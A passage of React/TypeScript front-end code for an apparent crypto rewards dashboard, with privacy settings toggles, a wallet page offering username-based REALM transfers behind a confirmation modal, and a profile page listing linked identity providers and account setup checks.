                  'w-12 h-6 rounded-full p-1 transition-colors duration-300',
                  preferences.notifications[item.key as keyof AppPreferences['notifications']] ? 'bg-realm-cyan' : 'bg-white/10'
                )}
              >
                <div
                  className={cn(
                    'w-4 h-4 bg-white rounded-full transition-transform duration-300',
                    preferences.notifications[item.key as keyof AppPreferences['notifications']] ? 'translate-x-6' : 'translate-x-0'
                  )}
                />
              </button>
            </div>
          ))}
        </div>
      </div>

      <div className="glass-panel p-8 space-y-6">
        <div className="flex items-start justify-between gap-4">
          <div>
            <h3 className="text-serif text-3xl">Identity visibility</h3>
            <p className="mt-2 text-sm text-white/40">
              Control how much of your identity is shown across the product.
            </p>
          </div>
          <div className="rounded-full border border-white/10 px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em] text-white/45">
            Profile linked
          </div>
        </div>

        <div className="space-y-6">
          <div className="space-y-3">
            <p className="text-sm font-medium text-white">Profile visibility</p>
            <div className="grid gap-3 md:grid-cols-3">
              {[
                { value: 'private', title: 'Private', detail: 'Only expose core account data inside direct profile access.' },
                { value: 'network', title: 'Trusted network', detail: 'Allow moderate workspace visibility without exposing everything.' },
                { value: 'public', title: 'Public', detail: 'Make the profile presentation more promotional than protective.' },
              ].map((option) => (
                <button
                  key={option.value}
                  onClick={() => updatePreferences((current) => ({
                    ...current,
                    privacy: { ...current.privacy, profileVisibility: option.value as AppPreferences['privacy']['profileVisibility'] },
                  }))}
                  className={cn(
                    'rounded-2xl border p-4 text-left transition-all',
                    preferences.privacy.profileVisibility === option.value
                      ? 'border-realm-cyan bg-realm-cyan/10'
                      : 'border-white/10 bg-white/[0.02] hover:border-white/25'
                  )}
                >
                  <p className="font-semibold text-white">{option.title}</p>
                  <p className="mt-2 text-xs text-white/45">{option.detail}</p>
                </button>
              ))}
            </div>
          </div>

          {[
            {
              key: 'maskWalletAddress',
              title: 'Mask wallet address by default',
              description: 'Shortens the wallet everywhere outside dedicated transfer flows so the profile reads like an identity layer, not a raw dump.',
            },
            {
              key: 'showReferralCode',
              title: 'Show referral code in profile',
              description: 'Keeps the referral code visible on the profile surface when you actively use the dashboard for invites.',
            },
          ].map((item) => (
            <div key={item.key} className="flex items-center justify-between gap-4 border-b border-white/5 pb-5 last:border-0 last:pb-0">
              <div className="space-y-1 pr-6">
                <p className="font-medium text-white">{item.title}</p>
                <p className="text-xs text-white/40 font-mono">{item.description}</p>
              </div>
              <button
                onClick={() => updatePreferences((current) => ({
                  ...current,
                  privacy: {
                    ...current.privacy,
                    [item.key]: !current.privacy[item.key as keyof AppPreferences['privacy']],
                  },
                }))}
                className={cn(
                  'w-12 h-6 rounded-full p-1 transition-colors duration-300',
                  preferences.privacy[item.key as keyof Pick<AppPreferences['privacy'], 'maskWalletAddress' | 'showReferralCode'>] ? 'bg-realm-cyan' : 'bg-white/10'
                )}
              >
                <div
                  className={cn(
                    'w-4 h-4 bg-white rounded-full transition-transform duration-300',
                    preferences.privacy[item.key as keyof Pick<AppPreferences['privacy'], 'maskWalletAddress' | 'showReferralCode'>] ? 'translate-x-6' : 'translate-x-0'
                  )}
                />
              </button>
            </div>
          ))}
        </div>
      </div>

      <div className="glass-panel p-8">
        <h3 className="text-serif text-3xl">What these settings mean</h3>
        <div className="mt-5 space-y-3">
          {trustNotes.map((note) => (
            <div key={note} className="flex items-start gap-3 rounded-2xl border border-white/8 bg-white/[0.02] p-4">
              <ShieldCheck size={16} className="mt-0.5 text-realm-cyan" />
              <p className="text-sm text-white/65">{note}</p>
            </div>
          ))}
        </div>
      </div>
      
      <div className="flex justify-end gap-4 pt-6">
        <button
          onClick={() => {
            setPreferences(DEFAULT_APP_PREFERENCES);
            saveAppPreferences(DEFAULT_APP_PREFERENCES);
            notify('Preferences reset to trusted defaults.');
          }}
          className="px-8 py-3 border border-white/10 rounded-xl text-sm font-medium hover:bg-white/5 transition-all"
        >
          Reset
        </button>
        <button
          onClick={() => {
            saveAppPreferences(preferences);
            notify('Preferences saved and applied to the workspace.');
          }}
          className="px-8 py-3 bg-realm-cyan text-realm-black rounded-xl text-sm font-bold hover:shadow-[0_0_20px_rgba(61,242,224,0.3)] transition-all"
        >
          Save settings
        </button>
      </div>
    </div>
  );
};

const WalletPage = () => {
  const [balance, setBalance] = useState(0);
  const [transferAmount, setTransferAmount] = useState('');
  const [recipient, setRecipient] = useState('');
  const [transferring, setTransferring] = useState(false);
  const [message, setMessage] = useState('');
  const [history, setHistory] = useState<any[]>([]);
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const normalizedRecipient = recipient.trim().replace(/^@+/, '');

  const initiateTransfer = () => {
    if (!normalizedRecipient || !transferAmount) {
      setMessage('Please enter a username and amount.');
      return;
    }

    if (!/^[a-zA-Z0-9_]{3,20}$/.test(normalizedRecipient)) {
      setMessage('Recipient must be a valid username.');
      return;
    }

    setMessage('');
    setShowConfirmModal(true);
  };

  const fetchData = async () => {
    try {
      const balRes = await fetch('/api/wallet/balance', { credentials: 'include' });
      const histRes = await fetch('/api/mining/history', { credentials: 'include' });
      if (balRes.ok) {
        const data = await balRes.json();
        setBalance(data.balance);
      }
      if (histRes.ok) {
        setHistory(await histRes.json());
      }
    } catch (e) {}
  };

  useEffect(() => {
    fetchData();
    window.addEventListener('balance-updated', fetchData);
    return () => window.removeEventListener('balance-updated', fetchData);
  }, []);

  const handleTransfer = async () => {
    setShowConfirmModal(false);
    setTransferring(true);
    try {
      const res = await fetch('/api/wallet/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          recipient: normalizedRecipient,
          amount: parseFloat(transferAmount)
        }),
        credentials: 'include'
      });
      const data = await res.json();
      if (res.ok) {
        setMessage('Transfer successful!');
        setBalance(data.newBalance);
        setTransferAmount('');
        setRecipient('');
        window.dispatchEvent(new Event('balance-updated'));
        fetchData();
      } else {
        setMessage(data.message || 'Transfer failed');
      }
    } catch (e) {
      setMessage('Error during transfer');
    }
    setTransferring(false);
  };

  const successfulPayouts = history.filter((entry) => !entry.isActive && Number(entry.pointsEarned || 0) > 0);
  const avgPayout = successfulPayouts.length
    ? successfulPayouts.reduce((sum, entry) => sum + Number(entry.pointsEarned || 0), 0) / successfulPayouts.length
    : 0;
  const unsettledPayouts = Math.max(history.length - successfulPayouts.length, 0);

  return (
    <div className="space-y-12">
      <section>
        <h1 className="text-serif text-6xl font-medium mb-4">
          Wallet <span className="text-realm-cyan">Overview</span>
        </h1>
        <p className="text-white/40 font-mono text-xs tracking-[0.2em] uppercase">Balances, payout history, and private transfers</p>
      </section>

      <div className="grid grid-cols-12 gap-8">
        <div className="col-span-12 lg:col-span-4 space-y-8">
          <div className="glass-panel p-10 relative overflow-hidden flex flex-col justify-between h-80">
            <div className="absolute top-0 right-0 w-64 h-64 bg-realm-cyan/5 blur-[80px] -mr-32 -mt-32" />
            <div className="relative z-10">
              <p className="text-[10px] text-white/30 font-mono uppercase tracking-widest mb-4">Available Liquidity</p>
              <div className="flex items-baseline gap-2">
                <span className="font-munich text-6xl text-white tracking-widest">{balance.toFixed(2)}</span>
                <span className="text-realm-cyan font-mono text-sm">REALM</span>
              </div>
              <p className="mt-2 text-[10px] opacity-40 font-mono">≈ ${(balance * 0.12).toFixed(2)} USD</p>
            </div>
            
            <div className="flex gap-4 pt-8 border-t border-white/5">
              <div className="flex-1">
                <p className="text-[9px] text-white/20 font-mono uppercase mb-1">Staked</p>
                <p className="text-sm font-medium">0.00</p>
              </div>
              <div className="flex-1 text-right">
                <p className="text-[9px] text-white/20 font-mono uppercase mb-1">Locked</p>
                <p className="text-sm font-medium">0.00</p>
              </div>
            </div>
          </div>

          <div className="glass-panel p-8">
            <div className="flex items-start justify-between gap-4">
              <div>
                <p className="text-[10px] text-white/35 font-mono uppercase tracking-[0.22em]">Payout record</p>
                <h4 className="mt-3 text-xl font-semibold text-white">Settled history</h4>
              </div>
              <ShieldCheck size={18} className="text-realm-cyan" />
            </div>

            <div className="mt-6 grid grid-cols-3 gap-4">
              <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Settled runs</p>
                <p className="mt-3 text-xl font-luciana text-realm-cyan">{successfulPayouts.length}</p>
              </div>
              <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Avg payout</p>
                <p className="mt-3 text-xl font-luciana text-white">{avgPayout.toFixed(2)}</p>
              </div>
              <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Unsettled runs</p>
                <p className="mt-3 text-xl font-luciana text-white">{unsettledPayouts}</p>
              </div>
            </div>
          </div>

          <div className="glass-panel p-8">
              <h4 className="font-bold text-lg mb-6 flex items-center gap-2">
              <Activity size={18} className="text-realm-cyan" />
              Recent activity
            </h4>
            <div className="space-y-6">
              {history.length === 0 ? (
                <p className="text-xs text-white/20 font-mono">No recent wallet activity yet.</p>
              ) : (
                history.map((h, i) => (
                  <div key={i} className="flex justify-between items-center text-[11px] font-mono border-b border-white/5 pb-4 last:border-0 hover:border-realm-cyan/20 transition-all">
                    <div className="space-y-1">
                      <p className="text-white/60">Reward payout</p>
                      <p className="text-[9px] text-white/20">{new Date(h.startedAt).toLocaleDateString()}</p>
                    </div>
                    <p className="text-realm-cyan">+{h.pointsEarned.toFixed(2)}</p>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        <div className="col-span-12 lg:col-span-8 glass-panel p-12">
          <div className="max-w-xl">
            <h3 className="text-3xl font-bold mb-2">Send a transfer</h3>
            <p className="text-sm text-white/40 mb-10">Move REALM to another user by username without exposing email or wallet details.</p>
            
            <div className="space-y-8">
              <div className="space-y-3">
                <label className="text-[10px] text-white/40 font-mono uppercase tracking-[0.2em] ml-1">Recipient Identity</label>
                <div className="relative group">
                  <User className="absolute left-4 top-1/2 -translate-y-1/2 text-white/20 group-focus-within:text-realm-cyan transition-colors" size={18} />
                  <input 
                    type="text" 
                    value={recipient}
                    onChange={(e) => setRecipient(e.target.value)}
                    placeholder="Enter username"
                    className="w-full bg-white/5 border border-white/10 rounded-2xl pl-12 pr-4 py-4 text-sm text-white placeholder:text-white/20 focus:border-realm-cyan outline-none transition-all"
                    autoCapitalize="none"
                    autoCorrect="off"
                    spellCheck={false}
                  />
                </div>
                <p className="text-[11px] text-white/30 font-mono">Transfers only work with usernames. Email and wallet lookups stay hidden.</p>
              </div>

              <div className="space-y-3">
                <label className="text-[10px] text-white/40 font-mono uppercase tracking-[0.2em] ml-1">Transaction Volume</label>
                <div className="relative group">
                   <Zap className="absolute left-4 top-1/2 -translate-y-1/2 text-white/20 group-focus-within:text-realm-cyan transition-colors" size={18} />
                   <input 
                      type="number" 
                      value={transferAmount}
                      onChange={(e) => setTransferAmount(e.target.value)}
                      placeholder="0.00 REALM"
                      className="w-full bg-white/5 border border-white/10 rounded-2xl pl-12 pr-4 py-4 text-sm text-white placeholder:text-white/20 focus:border-realm-cyan outline-none transition-all"
                   />
                </div>
              </div>
              
              <div className="p-4 bg-realm-cyan/5 border border-realm-cyan/10 rounded-2xl flex items-center justify-between">
                <div className="flex items-center gap-3">
                   <div className="w-8 h-8 rounded-full bg-realm-cyan/10 flex items-center justify-center text-realm-cyan">
                     <ShieldCheck size={16} />
                   </div>
                   <p className="text-[10px] text-white/60 font-mono uppercase tracking-widest">Secure transfer</p>
                </div>
                <p className="text-[10px] text-white/20 font-mono uppercase">Fee: 0.00%</p>
              </div>

              {message && (
                <motion.div 
                   initial={{ opacity: 0, scale: 0.95 }}
                   animate={{ opacity: 1, scale: 1 }}
                   className={cn("p-4 rounded-xl text-xs font-mono text-center", message.includes('success') ? "bg-realm-cyan/20 text-realm-cyan" : "bg-red-400/20 text-red-400")}
                >
                  {message}
                </motion.div>
              )}

              <button 
                onClick={initiateTransfer}
                disabled={transferring}
                className="w-full py-5 bg-white text-realm-black rounded-2xl text-sm font-bold hover:bg-realm-cyan hover:shadow-[0_0_30px_rgba(61,242,224,0.3)] transition-all flex items-center justify-center gap-3 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {transferring ? (
                  <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin" />
                ) : (
                  <>Send transfer <ArrowUpRight size={18} /></>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Transfer Confirmation Modal */}
      {showConfirmModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="bg-realm-surface border border-realm-border p-6 rounded-xl w-[400px] max-w-[90vw] flex flex-col gap-6">
            <h2 className="text-xl font-bold text-white text-center">Confirm transfer</h2>
            <div className="space-y-4">
              <div className="flex justify-between items-center text-sm border-b border-white/5 pb-2">
                <span className="text-white/40">Amount</span>
                <span className="font-mono text-realm-cyan">{parseFloat(transferAmount).toFixed(2)} REALM</span>
              </div>
              <div className="flex justify-between items-center text-sm border-b border-white/5 pb-2">
                <span className="text-white/40">Recipient</span>
                <span className="font-mono text-white/80 max-w-[200px] truncate">@{normalizedRecipient}</span>
              </div>
              <div className="flex justify-between items-center text-sm">
                <span className="text-white/40">Network Fee</span>
                <span className="font-mono text-white/60">0.00 REALM</span>
              </div>
            </div>
            
            <p className="text-[10px] text-yellow-400/80 text-center font-mono leading-relaxed px-4">
              Transfers are final. Double-check the username before sending.
            </p>

            <div className="flex gap-4">
              <button onClick={() => setShowConfirmModal(false)} className="flex-1 py-3 text-xs font-bold text-white/60 hover:text-white border border-white/10 rounded-xl transition-colors">Cancel</button>
              <button onClick={handleTransfer} className="flex-1 py-3 bg-realm-cyan text-realm-black text-xs font-bold rounded-xl hover:shadow-[0_0_15px_rgba(61,242,224,0.3)] transition-all">Confirm</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
const Profile = () => {
  const [user, setUser] = useState<{ email?: string; walletAddress?: string; name?: string; avatarUrl?: string; username?: string; referralCode?: string; githubId?: string | null; discordId?: string | null; twitterId?: string | null } | null>(null);
  const [showEditModal, setShowEditModal] = useState(false);
  const [editName, setEditName] = useState('');
  const [editAvatar, setEditAvatar] = useState('');
  const [editUsername, setEditUsername] = useState('');
  const [tasks, setTasks] = useState<any[]>([]);
  const [history, setHistory] = useState<any[]>([]);
  const [profileMessage, setProfileMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
  const fileInputRef = React.useRef<HTMLInputElement>(null);
  const preferences = useAppPreferences();

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.size > 2 * 1024 * 1024) {
      setProfileMessage({ type: 'error', text: 'Image must be under 2MB.' });
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      setEditAvatar(reader.result as string);
    };
    reader.readAsDataURL(file);
  };

  useEffect(() => {
    const fetchProfileContext = async () => {
      try {
        const [userRes, taskRes, historyRes] = await Promise.all([
          fetch('/api/auth/me', { credentials: 'include' }),
          fetch('/api/tasks', { credentials: 'include' }),
          fetch('/api/mining/history', { credentials: 'include' }),
        ]);
        if (userRes.ok) setUser(await userRes.json());
        if (taskRes.ok) setTasks(await taskRes.json());
        if (historyRes.ok) setHistory(await historyRes.json());
      } catch (err) {}
    };
    fetchProfileContext();
    window.addEventListener('balance-updated', fetchProfileContext);
    return () => window.removeEventListener('balance-updated', fetchProfileContext);
  }, []);

  const disconnectProvider = async (provider: 'github' | 'discord' | 'twitter') => {
    try {
      const res = await fetch(`/api/auth/unlink/${provider}`, {
        method: 'POST',
        credentials: 'include',
      });

      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error || 'Failed to disconnect account');
      }

      const data = await res.json();
      setUser(data);
    } catch (error: any) {
      setProfileMessage({ type: 'error', text: error?.message || 'Failed to disconnect account' });
    }
  };

  const completedTasks = tasks.filter((task) => task.completed).length;
  const completedSessions = history.filter((entry) => !entry.isActive && Number(entry.pointsEarned || 0) > 0);
  const identityLinks = user ? getConnectedIdentityCount(user) : 0;
  const profileSetupItems = getProfileSetupItems(user);
  const completedProfileChecks = profileSetupItems.filter((item) => item.complete).length;
  const profileCheckTotal = profileSetupItems.length;
  const maskedWallet = maskWalletAddress(user?.walletAddress, preferences.privacy.maskWalletAddress);
  const disclosureLabel = getProfileVisibilityLabel(preferences.privacy.profileVisibility);
  const recoveryState = identityLinks >= 3 ? 'Strong recovery posture' : identityLinks >= 2 ? 'Recoverable' : 'Fragile';
  const recoveryTone = identityLinks >= 3 ? 'text-realm-cyan border-realm-cyan/30 bg-realm-cyan/10' : identityLinks >= 2 ? 'text-amber-200 border-amber-400/20 bg-amber-400/10' : 'text-red-300 border-red-400/20 bg-red-400/10';

  const identityProviders = [
    {
      key: 'google',
      label: 'Google identity',
      detail: user?.email || 'Not connected',
      connected: Boolean(user?.email),
      actionLabel: user?.email ? 'Sign out' : 'Connect',
      actionType: user?.email ? 'logout' : 'link',
      href: '/api/auth/google?returnTo=/?tab=profile',
      icon: Mail,
      accent: 'text-white',
      description: user?.email ? 'Primary recovery email for session restoration.' : 'Attach a recoverable email identity.',
    },
    {
      key: 'twitter',
      label: 'X account',
      detail: user?.twitterId || 'Not connected',
      connected: Boolean(user?.twitterId),
      actionLabel: user?.twitterId ? 'Disconnect' : 'Connect',
      actionType: user?.twitterId ? 'unlink' : 'link',
      href: '/api/auth/twitter?returnTo=/?tab=profile',
      icon: Link2,
      accent: 'text-white/70',
      description: user?.twitterId ? 'Used for social proof and mission eligibility.' : 'Required for X-based community tasks.',
    },
    {
      key: 'github',
      label: 'GitHub',
      detail: user?.githubId || 'Not connected',
      connected: Boolean(user?.githubId),
      actionLabel: user?.githubId ? 'Disconnect' : 'Connect',
      actionType: user?.githubId ? 'unlink' : 'link',
      href: '/api/auth/github?returnTo=/?tab=profile',
      icon: Fingerprint,
      accent: 'text-white/70',
      description: user?.githubId ? 'Adds a durable secondary identity handle.' : 'Adds a second recovery-grade identity signal.',
    },
    {
      key: 'discord',
      label: 'Discord',
      detail: user?.discordId || 'Not connected',
      connected: Boolean(user?.discordId),
      actionLabel: user?.discordId ? 'Disconnect' : 'Connect',
      actionType: user?.discordId ? 'unlink' : 'link',
      href: '/api/auth/discord?returnTo=/?tab=profile',
      icon: ShieldCheck,
      accent: 'text-white/70',
      description: user?.discordId ? 'Supports community verification and role sync.' : 'Needed for Discord-gated actions and role sync.',
    },
    {
      key: 'wallet',
      label: 'Wallet',
      detail: user?.walletAddress ? maskedWallet : 'Not connected',
      connected: Boolean(user?.walletAddress),
      actionLabel: user?.walletAddress ? 'Connected' : 'Open wallet connect',
      actionType: user?.walletAddress ? 'none' : 'navigate',
      href: '',
      icon: Wallet,
      accent: 'text-realm-cyan',
      description: user?.walletAddress ? 'Ownership anchor used for node rewards and payout identity.' : 'Connect a wallet to anchor ownership and payouts.',
    },
  ] as const;

  const hardeningChecklist = [
    {
      title: 'Recovery email present',
      done: Boolean(user?.email),
      detail: user?.email ? `Signed in as ${user.email}` : 'Add a recoverable email identity.',
    },
    {
      title: 'At least two linked identities',
      done: identityLinks >= 2,
      detail: identityLinks >= 2 ? `${identityLinks} identities linked` : 'Link another provider to reduce account lockout risk.',
    },
    {
      title: 'Wallet ownership anchored',
      done: Boolean(user?.walletAddress),
      detail: user?.walletAddress ? maskedWallet : 'Connect a wallet for payouts and node ownership proof.',
    },
    {
      title: 'Profile basics are present',
      done: completedProfileChecks >= 4,
      detail: `${completedProfileChecks}/${profileCheckTotal} setup steps are complete across name, handle, photo, sign-in, and backup access.`,
    },
    {
      title: 'Security notifications are enabled',
      done: preferences.notifications.securityAlerts,
      detail: preferences.notifications.securityAlerts ? 'Identity-risk notifications are active.' : 'Turn on security notices in Settings.',
    },
  ];

  const profilePreviewRows = [
    { label: 'Display name', value: user?.name || 'Anonymous Node' },
    { label: 'Handle', value: user?.username ? `@${user.username}` : 'Not set' },
    { label: 'Email', value: user?.email || 'Hidden until connected' },
    { label: 'Wallet', value: user?.walletAddress ? maskedWallet : 'Not connected' },
    { label: 'Referral', value: preferences.privacy.showReferralCode && user?.referralCode ? user.referralCode : 'Hidden by preference' },
  ];

  const runProviderAction = async (provider: (typeof identityProviders)[number]) => {
    if (provider.actionType === 'link') {
      window.location.assign(provider.href);
      return;
    }

    if (provider.actionType === 'logout') {
      window.location.assign('/api/auth/logout');
      return;
    }

    if (provider.actionType === 'unlink') {
      await disconnectProvider(provider.key as 'github' | 'discord' | 'twitter');
      setProfileMessage({ type: 'success', text: `${provider.label} disconnected.` });
    }
  };

  return (
    <div className="max-w-4xl mx-auto space-y-12 py-10">
      {profileMessage && (
        <div
          className={cn(
            'rounded-2xl border px-5 py-4 text-sm',
            profileMessage.type === 'success'
              ? 'border-realm-cyan/30 bg-realm-cyan/10 text-realm-cyan'
              : 'border-red-400/20 bg-red-400/10 text-red-200'
          )}
        >
          {profileMessage.text}
        </div>
      )}

      <div className="glass-panel overflow-hidden p-0">
        <div className="grid gap-0 md:grid-cols-[1.25fr_0.75fr]">
          <div className="space-y-6 p-8 md:p-10">
            <div className="flex flex-wrap items-center gap-3">
              <span className={cn('rounded-full border px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em]', recoveryTone)}>
                {recoveryState}
              </span>
              <span className="rounded-full border border-white/10 px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em] text-white/45">
                Visibility {disclosureLabel}
              </span>
            </div>

            <div className="flex flex-col gap-6 md:flex-row md:items-end">
              <div className="w-28 h-28 rounded-3xl bg-gradient-to-br from-realm-cyan/20 to-transparent border border-realm-cyan/30 p-1">
                <div className="w-full h-full rounded-[22px] overflow-hidden bg-realm-surface flex items-center justify-center">
                  {user?.avatarUrl ? (
                    <img src={user.avatarUrl} alt="Avatar" className="w-full h-full object-cover" />
                  ) : user?.email ? (
                    <span className="text-3xl font-bold text-realm-cyan">{user.email[0].toUpperCase()}</span>
                  ) : (
                    <User size={40} className="text-white/20" />
                  )}
                </div>
              </div>

              <div className="flex-1">
                <h1 className="text-serif text-5xl italic text-white">
                  {user?.name || user?.email?.split('@')[0] || maskedWallet || 'Anonymous Node'}
                </h1>
                <p className="mt-3 max-w-xl text-sm text-white/50">
                  Your account, linked identities, and profile details in one place.
                </p>
                <div className="mt-4 flex flex-wrap gap-3 text-sm text-white/55">
                  {user?.username && <span className="text-realm-cyan">@{user.username}</span>}
                  {user?.email && <span>{user.email}</span>}
                  {user?.walletAddress && <span>{maskedWallet}</span>}
                </div>
              </div>
            </div>
          </div>

          <div className="border-t border-white/5 bg-white/[0.02] p-8 md:border-l md:border-t-0">
            <div className="space-y-5">
              <div className="grid grid-cols-2 gap-3">
                <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                  <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Linked identities</p>
                  <p className="mt-2 text-2xl font-semibold text-white">{identityLinks}</p>
                </div>
                <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                  <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Verified sessions</p>
                  <p className="mt-2 text-2xl font-semibold text-white">{completedSessions.length}</p>
                </div>
              </div>
              <button
                onClick={() => {
                  setEditName(user?.name || '');
                  setEditAvatar(user?.avatarUrl || '');
                  setEditUsername(user?.username || '');
                  setShowEditModal(true);
                }}
                className="w-full rounded-xl border border-white/10 bg-white/5 px-5 py-3 text-sm font-medium text-white hover:bg-white/10 transition-all"
              >
                Edit profile identity
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-3 gap-6">
        {[
          { label: 'Linked identities', value: `${identityLinks}` },
          { label: 'Tasks completed', value: `${completedTasks}` },
          { label: 'Reward sessions', value: `${completedSessions.length}` },
        ].map((stat) => (
          <div key={stat.label} className="glass-panel p-8 text-center">
            <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-2">{stat.label}</p>
            <p className="text-3xl font-medium">{stat.value}</p>
          </div>
        ))}
      </div>

      <div className="glass-panel p-10 space-y-6">
        <div className="flex items-start justify-between gap-6">
          <div>
            <h3 className="text-serif text-3xl">Account overview</h3>
            <p className="mt-2 text-sm text-white/40">
              A clear summary of your setup, rewards, and current privacy posture.
            </p>
          </div>
          <div className="rounded-2xl border border-realm-cyan/20 bg-realm-cyan/10 px-5 py-4 text-right">
            <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-realm-cyan/70">Recovery status</p>
            <p className="mt-2 text-2xl font-semibold text-realm-cyan">{recoveryState}</p>
          </div>
        </div>

        <div className="grid gap-4 md:grid-cols-3">
          <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-5">
            <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Profile setup</p>
            <p className="mt-4 text-2xl font-semibold text-white">{completedProfileChecks}/{profileCheckTotal}</p>
            <p className="mt-1 text-xs text-white/35">Name, handle, avatar, primary login, and recovery coverage</p>
          </div>
          <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-5">
            <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Verified payouts</p>
            <p className="mt-4 text-2xl font-semibold text-white">{completedSessions.length}</p>
            <p className="mt-1 text-xs text-white/35">Completed mining sessions that paid out successfully</p>
          </div>
          <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-5">
            <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Profile disclosure</p>
            <p className="mt-4 text-2xl font-semibold text-white">{disclosureLabel}</p>
            <p className="mt-1 text-xs text-white/35">Matches the visibility setting you chose in Settings</p>
          </div>
        </div>
      </div>

      <div className="glass-panel p-10 space-y-6">
        <div className="flex items-start justify-between gap-4">
          <div>
            <h3 className="text-serif text-3xl">Profile checklist</h3>
            <p className="mt-2 text-sm text-white/40">
              A quick list of what is done and what still needs attention.
            </p>
          </div>
          <a href="/?tab=settings" className="text-sm text-realm-cyan hover:text-white transition-colors">
            Adjust settings
          </a>
        </div>
        <div className="space-y-4">
          {hardeningChecklist.map((item) => (
            <div key={item.title} className="flex items-start justify-between gap-4 rounded-2xl border border-white/8 bg-white/[0.02] px-5 py-4">
              <div className="flex items-start gap-3">
                <div className={cn('mt-0.5 flex h-8 w-8 items-center justify-center rounded-xl border', item.done ? 'border-realm-cyan/30 bg-realm-cyan/10 text-realm-cyan' : 'border-white/10 bg-white/[0.03] text-white/40')}>
                  {item.done ? <BadgeCheck size={16} /> : <ShieldAlert size={16} />}
                </div>
                <div>
                  <p className="text-sm font-medium text-white">{item.title}</p>
                  <p className="mt-1 text-xs font-mono text-white/40">{item.detail}</p>
                </div>
              </div>
              <span className={cn('rounded-full px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em]', item.done ? 'bg-realm-cyan/10 text-realm-cyan' : 'bg-white/5 text-white/45')}>
                {item.done ? 'Complete' : 'Needs action'}
              </span>
            </div>
          ))}
        </div>
      </div>

      <div className="glass-panel p-10 space-y-8">
        <div className="flex items-start justify-between gap-4">
          <div>
            <h3 className="text-serif text-3xl">Connected accounts</h3>
            <p className="mt-2 text-sm text-white/40">
              These rows reflect the real status of each connected account.
            </p>
          </div>
          <div className="rounded-full border border-white/10 px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em] text-white/45">
            {identityLinks} linked
          </div>
        </div>
        <div className="space-y-4">
          {identityProviders.map((provider) => {
            const Icon = provider.icon;
            return (
              <div key={provider.key} className="flex flex-col gap-4 rounded-2xl border border-white/8 bg-white/[0.02] p-5 md:flex-row md:items-center md:justify-between">
                <div className="flex items-start gap-4">
                  <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-white/10 bg-white/[0.03]">
                    <Icon size={18} className={provider.accent} />
                  </div>
                  <div>
                    <div className="flex items-center gap-3">
                      <p className="font-medium text-white">{provider.label}</p>
                      <span className={cn('rounded-full px-2.5 py-1 text-[10px] font-mono uppercase tracking-[0.2em]', provider.connected ? 'bg-realm-cyan/10 text-realm-cyan' : 'bg-white/5 text-white/40')}>
                        {provider.connected ? 'Connected' : 'Missing'}
                      </span>
                    </div>
                    <p className="mt-1 text-xs font-mono text-white/40">{provider.detail}</p>
                    <p className="mt-2 text-sm text-white/50">{provider.description}</p>
                  </div>
                </div>

                {provider.key === 'wallet' ? (
                  <Suspense fallback={<div className="h-11 w-44 rounded-xl bg-white/5 animate-pulse" />}>
                    <WalletConnectControl
                      className="w-full md:w-auto"
                      buttonClassName="w-full md:w-auto"
                      connectedButtonClassName="w-full justify-center md:w-auto"
                    />
                  </Suspense>
                ) : (
                  <button
                    onClick={() => void runProviderAction(provider)}
                    className={cn(
                      'rounded-xl px-4 py-2 text-sm font-semibold transition-all',
                      provider.connected && provider.actionType !== 'logout'
                          ? 'border border-red-400/20 text-red-300 hover:bg-red-400/10'
                          : 'bg-white text-realm-black hover:bg-realm-cyan'
                    )}
                  >
                    {provider.actionLabel}
                  </button>
                )}
              </div>
            );
          })}
        </div>
      </div>

      <div className="grid gap-6 md:grid-cols-[1.05fr_0.95fr]">
        <div className="glass-panel p-8">
          <div className="flex items-start justify-between gap-4">
            <div>
            <h3 className="text-serif text-3xl">Profile preview</h3>
            <p className="mt-2 text-sm text-white/40">
              This is how your profile details appear with your current settings.
            </p>
            </div>
            <div className="flex items-center gap-2 rounded-full border border-white/10 px-3 py-1 text-[10px] font-mono uppercase tracking-[0.2em] text-white/45">
              {preferences.privacy.maskWalletAddress ? <EyeOff size={12} /> : <Eye size={12} />}
              {disclosureLabel}
            </div>
          </div>

          <div className="mt-6 space-y-3">
            {profilePreviewRows.map((row) => (
              <div key={row.label} className="flex items-center justify-between rounded-2xl border border-white/8 bg-white/[0.02] px-4 py-3">
